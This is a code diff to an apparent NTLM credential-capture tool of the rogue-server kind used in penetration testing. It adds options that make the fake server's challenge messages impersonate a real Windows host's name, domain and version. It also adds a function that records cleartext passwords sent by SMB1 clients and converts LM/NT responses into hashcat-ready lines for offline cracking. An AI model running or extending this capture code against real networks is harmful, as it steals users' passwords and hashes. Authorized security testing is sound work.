@@ -105,6 +105,9 @@ NTLM_VERSION_PLACEHOLDER: bytes = b"\x00" * 8
 # VERSION structure per [MS-NLMP section 2.2.2.10]
 NTLM_VERSION_LEN: int = 8
 
+# NTLMSSP_REVISION_W2K3 per [MS-NLMP] §2.2.2.10 — all modern Windows use 0x0F.
+NTLM_REVISION_W2K3: int = 0x0F
+
 # Offset from the Unix epoch (1 Jan 1970) to the Windows FILETIME epoch
 # (1 Jan 1601), expressed in 100-nanosecond intervals.
 NTLM_FILETIME_EPOCH_OFFSET: int = 116_444_736_000_000_000
@@ -123,6 +126,7 @@ NTLM_FILETIME_TICKS_PER_SECOND: int = 10_000_000
 #
 NTLM_TRANSPORT_RAW: str = "raw"
 NTLM_TRANSPORT_NTLMSSP: str = "ntlmssp"
+NTLM_TRANSPORT_CLEARTEXT: str = "cleartext"
 
 # ===========================================================================
 # Hash Types  (MS-NLMP §3.3)
@@ -232,6 +236,28 @@ def NTLM_AUTH_classify(
 _parse_challenge = BytesValue(NTLM_CHALLENGE_LEN)
 
 
+def _parse_ntlm_version(value: str | None) -> bytes:
+    """Parse "major.minor.build" into the 8-byte NTLM VERSION structure.
+
+    Per [MS-NLMP] §2.2.2.10: ProductMajorVersion(1) + ProductMinorVersion(1)
+    + ProductBuild(2 LE) + Reserved(3 zero) + NTLMRevisionCurrent(1).
+
+    "0.0.0" or None returns the all-zero placeholder.
+    """
+    if value is None or str(value).strip() in ("", "0.0.0"):
+        return NTLM_VERSION_PLACEHOLDER
+    parts = str(value).strip().split(".")
+    major = int(parts[0]) & 0xFF
+    minor = int(parts[1]) & 0xFF if len(parts) > 1 else 0
+    build = int(parts[2]) & 0xFFFF if len(parts) > 2 else 0
+    return (
+        bytes([major, minor])
+        + build.to_bytes(2, "little")
+        + b"\x00\x00\x00"
+        + bytes([NTLM_REVISION_W2K3])
+    )
+
+
 # ===========================================================================
 # Configuration Attributes
 #
@@ -266,6 +292,61 @@ ATTR_NTLM_DISABLE_NTLMV2 = Attribute(
     False,  # Default: NTLMv2 enabled (TargetInfoFields present)
     section_local=False,
     factory=is_true,
+)
+
+# --- NTLM Identity Attributes (CHALLENGE_MESSAGE AV_PAIRs) ---------------
+# These control the server identity inside the NTLMSSP CHALLENGE_MESSAGE.
+# None means "derive from the protocol's own identity config" — each
+# protocol handler resolves the fallback chain.
+
+ATTR_NTLM_TARGET_TYPE = Attribute(
+    "ntlm_target_type",
+    "NTLM.TargetType",
+    "server",  # NTLMSSP_TARGET_TYPE_SERVER; "domain" for _DOMAIN
+    section_local=False,
+)
+
+ATTR_NTLM_VERSION = Attribute(
+    "ntlm_version",
+    "NTLM.Version",
+    "0.0.0",  # All-zero placeholder; e.g. "10.0.20348" for Server 2022
+    section_local=False,
+    factory=_parse_ntlm_version,
+)
+
+ATTR_NTLM_NB_COMPUTER = Attribute(
+    "ntlm_nb_computer",
+    "NTLM.NetBIOSComputer",
+    None,  # MsvAvNbComputerName (AV_PAIR 0x0001); None → from protocol config
+    section_local=False,
+)
+
+ATTR_NTLM_NB_DOMAIN = Attribute(
+    "ntlm_nb_domain",
+    "NTLM.NetBIOSDomain",
+    None,  # MsvAvNbDomainName (AV_PAIR 0x0002); None → from protocol config
+    section_local=False,
+)
+
+ATTR_NTLM_DNS_COMPUTER = Attribute(
+    "ntlm_dns_computer",
+    "NTLM.DnsComputer",
+    None,  # MsvAvDnsComputerName (AV_PAIR 0x0003); None → derived
+    section_local=False,
+)
+
+ATTR_NTLM_DNS_DOMAIN = Attribute(
+    "ntlm_dns_domain",
+    "NTLM.DnsDomain",
+    None,  # MsvAvDnsDomainName (AV_PAIR 0x0004); None → from protocol config
+    section_local=False,
+)
+
+ATTR_NTLM_DNS_TREE = Attribute(
+    "ntlm_dns_tree",
+    "NTLM.DnsTree",
+    None,  # MsvAvDnsTreeName (AV_PAIR 0x0005); None → from DnsDomain
+    section_local=False,
 )
 
 
@@ -850,6 +931,14 @@ def NTLM_AUTH_CreateChallenge(
     challenge: bytes,
     disable_ess: bool = False,
     disable_ntlmv2: bool = False,
+    *,
+    target_type: str = "server",
+    version: bytes | None = None,
+    nb_computer: str | None = None,
+    nb_domain: str | None = None,
+    dns_computer: str | None = None,
+    dns_domain: str | None = None,
+    dns_tree: str | None = None,
 ) -> ntlm.NTLMAuthChallenge:
     """Build a CHALLENGE_MESSAGE from the client's NEGOTIATE_MESSAGE flags.
 
@@ -904,9 +993,15 @@ def NTLM_AUTH_CreateChallenge(
     )
 
     # -- Build the response flags for CHALLENGE_MESSAGE ----------------------
+    # [MS-NLMP] §3.2.5.1.1: exactly one TARGET_TYPE flag must be set.
+    target_type_flag = (
+        ntlm.NTLMSSP_TARGET_TYPE_DOMAIN
+        if target_type == "domain"
+        else ntlm.NTLMSSP_TARGET_TYPE_SERVER
+    )
     response_flags: int = (
         ntlm.NTLMSSP_REQUEST_TARGET  # TargetName is supplied
-        | ntlm.NTLMSSP_TARGET_TYPE_SERVER  # Target is a server, not domain
+        | target_type_flag
     )
 
     # -- TargetInfoFields (controls NTLMv2 availability) -------------------
@@ -959,15 +1054,21 @@ def NTLM_AUTH_CreateChallenge(
         response_flags &= ~ntlm.NTLMSSP_NEGOTIATE_LM_KEY
 
     # -- Assemble the CHALLENGE_MESSAGE ------------------------------------
-    # TargetName (§2.2.1.2): the server's authentication realm.  A domain-
-    # joined server returns the NetBIOS domain name (flat, first DNS label,
-    # uppercase); a workgroup server returns the NetBIOS computer name.
-    # We always use the domain: NTLM_split_fqdn guarantees `domain` is
-    # either the DNS suffix (e.g. "corp.example.com") or "WORKGROUP".
-    target_name_str: str = (
-        domain.split(".", 1)[0].upper() if "." in domain else domain.upper()
-    )
+    # TargetName (§2.2.1.2): the server's authentication realm.
+    # [MS-NLMP] §3.2.5.1.1: TARGET_TYPE_SERVER → TargetName = server name;
+    # TARGET_TYPE_DOMAIN → TargetName = domain name.
+    if target_type == "domain":
+        target_name_str = (
+            (nb_domain or domain.split(".", 1)[0]).upper()
+            if "." in domain
+            else (nb_domain or domain).upper()
+        )
+    else:
+        target_name_str = (nb_computer or name).upper()
     target_name_bytes: bytes = NTLM_AUTH_encode_string(target_name_str, response_flags)
+
+    # VERSION structure — [MS-NLMP] §2.2.2.10
+    version_bytes = version if version is not None else NTLM_VERSION_PLACEHOLDER
 
     challenge_message = ntlm.NTLMAuthChallenge()
     challenge_message["flags"] = response_flags
@@ -976,7 +1077,7 @@ def NTLM_AUTH_CreateChallenge(
     challenge_message["domain_max_len"] = len(target_name_bytes)
     challenge_message["domain_offset"] = NTLM_CHALLENGE_MSG_DOMAIN_OFFSET
     challenge_message["domain_name"] = target_name_bytes
-    challenge_message["Version"] = NTLM_VERSION_PLACEHOLDER
+    challenge_message["Version"] = version_bytes
     challenge_message["VersionLen"] = NTLM_VERSION_LEN
 
     # TargetInfoFields (§2.2.1.2) sits immediately after TargetName in the
@@ -1016,27 +1117,25 @@ def NTLM_AUTH_CreateChallenge(
         # any order per spec; ascending AvId matches real Windows behaviour.
 
         # 1. Input defaults -------------------------------------------------
-        # NTLM_split_fqdn guarantees non-empty strings, but guard explicitly
-        # so the rest of this block never operates on empty inputs.
         av_name = name or "WORKSTATION"
         av_domain = domain or "WORKGROUP"
         is_domain_joined = av_domain not in ("", "WORKGROUP")
 
         # 2. String processing ----------------------------------------------
-        # Derive the exact Unicode string that each AV_PAIR constant expects.
-        # NetBIOS names are flat (no dots) and uppercase per NetBIOS convention.
-        # DNS names preserve their original case from the FQDN configuration.
-        nb_computer_str = av_name.upper()  # 0x0001: "SERVER1"
-        nb_domain_str = (
+        # Derive defaults, then apply any explicit overrides from config.
+        nb_computer_str = nb_computer or av_name.upper()  # 0x0001
+        nb_domain_str = nb_domain or (
             av_domain.split(".", 1)[0].upper() if "." in av_domain else av_domain.upper()
-        )  # 0x0002: "CORP"
-        dns_computer_str = (
+        )  # 0x0002
+        dns_computer_str = dns_computer or (
             f"{av_name}.{av_domain}" if is_domain_joined else av_name
-        )  # 0x0003: "server1.corp.example.com"
-        dns_domain_str = av_domain  # 0x0004: "corp.example.com"
+        )  # 0x0003
+        dns_domain_str = dns_domain or av_domain  # 0x0004
         dns_tree_str = (
-            av_domain if is_domain_joined else None
-        )  # 0x0005: "corp.example.com", or None to omit
+            dns_tree
+            if dns_tree is not None
+            else (av_domain if is_domain_joined else None)
+        )  # 0x0005
 
         # 3. Encoding -------------------------------------------------------
         # NTLM_AUTH_encode_string selects UTF-16LE or OEM based on the
@@ -1194,3 +1293,126 @@ def NTLM_report_auth(
         )
     except Exception:
         log.exception("Failed to extract NTLM hashes from AUTHENTICATE_MESSAGE")
+
+
+def NTLM_report_raw_fields(
+    user_name: bytes | str,
+    domain_name: bytes | str,
+    lm_response: bytes | None,
+    nt_response: bytes | None,
+    challenge: bytes,
+    client: tuple[str, int],
+    session: SessionConfig,
+    logger: ProtocolLogger | None = None,
+    extras: dict[str, Any] | None = None,
+    transport: str = NTLM_TRANSPORT_RAW,
+    cleartext_password: str | None = None,
+) -> None:
+    """Extract and report hashes from raw SMB1 basic-security fields (G4).
+
+    For NTLM_TRANSPORT_RAW: classifies LM/NT response bytes and formats
+    hashcat lines using the existing pipeline. No NTLMSSP wrapper exists
+    on this path — do NOT create a fake NTLMAuthChallengeResponse.
+
+    For NTLM_TRANSPORT_CLEARTEXT: stores the raw password directly.
+
+    :param user_name: AccountName from SESSION_SETUP_ANDX
+    :param domain_name: PrimaryDomain from SESSION_SETUP_ANDX
+    :param lm_response: OEMPassword (LM response) — None for cleartext
+    :param nt_response: UnicodePassword (NT response) — None for cleartext
+    :param challenge: 8-byte server challenge from negotiate
+    :param client: (host, port) tuple
+    :param session: Session context with .db
+    :param logger: Protocol logger
+    :param extras: Additional metadata
+    :param transport: NTLM_TRANSPORT_RAW or NTLM_TRANSPORT_CLEARTEXT
+    :param cleartext_password: Raw password for cleartext transport
+    """
+    log = logger or dm_logger
+
+    # Decode identity strings
+    user: str = (
+        user_name.decode("utf-16-le", errors="replace")
+        if isinstance(user_name, (bytes, bytearray, memoryview))
+        else (user_name or "")
+    )
+    domain: str = (
+        domain_name.decode("utf-16-le", errors="replace")
+        if isinstance(domain_name, (bytes, bytearray, memoryview))
+        else (domain_name or "")
+    )
+
+    if transport == NTLM_TRANSPORT_CLEARTEXT:
+        if not cleartext_password:
+            log.debug("Empty cleartext password; skipping capture")
+            return
+
+        log.success(
+            f"Cleartext password captured: {user}\\{domain}",
+        )
+        extras = extras or {}
+        extras[_HOST_INFO] = "SMB1 cleartext"
+        session.db.add_auth(
+            client=client,
+            credtype="Cleartext",
+            username=user,
+            domain=domain,
+            password=cleartext_password,
+            logger=logger,
+            extras=extras,
+        )
+        return
+
+    # RAW transport — classify and format hashes
+    lm_response = lm_response or b""
+    nt_response = nt_response or b""
+
+    # Anonymous check — empty user + empty NT + empty/null LM
+    if not user and not nt_response and (not lm_response or lm_response == b"\x00"):
+        log.debug("Anonymous SMB1 basic-security login; skipping hash extraction")
+        return
+
+    if not nt_response and not lm_response:
+        log.debug("Both LM and NT responses empty; skipping")
+        return
+
+    try:
+        # negotiate_flags=0: no NTLMSSP flags exist on this path
+        all_hashes = NTLM_AUTH_to_hashcat_formats(
+            server_challenge=challenge,
+            user_name=user,
+            domain_name=domain,
+            lm_response=lm_response,
+            nt_response=nt_response,
+            negotiate_flags=0,
+        )
+
+        if not all_hashes:
+            log.warning(
+                "SMB1 basic-security auth produced no crackable hashes (user=%r)",
+                user,
+            )
+            return
+
+        log.debug(
+            "Writing %d hash(es) from SMB1 basic-security for user=%r",
+            len(all_hashes),
+            user,
+        )
+        extras = extras or {}
+        extras[_HOST_INFO] = "SMB1 raw"
+        for version_label, hashcat_line in all_hashes:
+            session.db.add_auth(
+                client=client,
+                credtype=version_label,
+                username=user,
+                domain=domain,
+                password=hashcat_line,
+                logger=logger,
+                extras=extras,
+            )
+
+    except ValueError:
+        log.exception("Invalid data in SMB1 basic-security auth; skipping capture")
+    except Exception:
+        log.exception("Failed to extract hashes from SMB1 basic-security auth")
